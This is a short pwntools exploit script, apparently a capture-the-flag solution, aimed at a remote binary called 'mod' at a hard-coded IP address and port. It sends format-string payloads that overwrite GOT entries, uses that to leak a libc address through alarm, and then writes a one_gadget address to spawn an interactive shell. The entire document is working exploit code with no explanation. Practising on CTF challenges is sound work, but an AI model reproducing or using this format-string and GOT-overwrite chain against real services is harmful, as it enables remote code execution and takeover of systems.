from pwn import *

#io = process('./mod')
io = remote('65.21.255.31', 33710)
elf = ELF('./mod')
libc = ELF('../lib/libc.so.6')
#gdb.attach(io)

io.sendlineafter(b'size: ', b'0s%9$sAA\x58\x40\x40')
pl = b'aaaaaaa '+p32(elf.sym['main'])
io.sendlineafter(b'data: ', pl)
io.sendlineafter(b'size: ', b'0s%9$sAA\x48\x40\x40\0\0')
pl = b'aaaaaaa '+p32(elf.sym['printf'])+b'\0'+b'\0'
io.sendlineafter(b'data: ', pl)
io.sendlineafter(b'size: ', b'0s%9$sAA\x38\x40\x40\0\0')
io.recv(2)
libc.address = u64(io.recv(6).ljust(8, b'\0')) - libc.sym['alarm']
log.info('Libc: '+hex(libc.address))
pl = b'aaaaaaa a'
io.sendlineafter(b'data: ', pl)
io.sendlineafter(b'size: ', b'0s%9$sAA\x58\x40\x40\0\0')
pl = b'aaaaaaa '+p64(libc.address+0xe3b01)
io.sendlineafter(b'data: ', pl)
io.interactive()
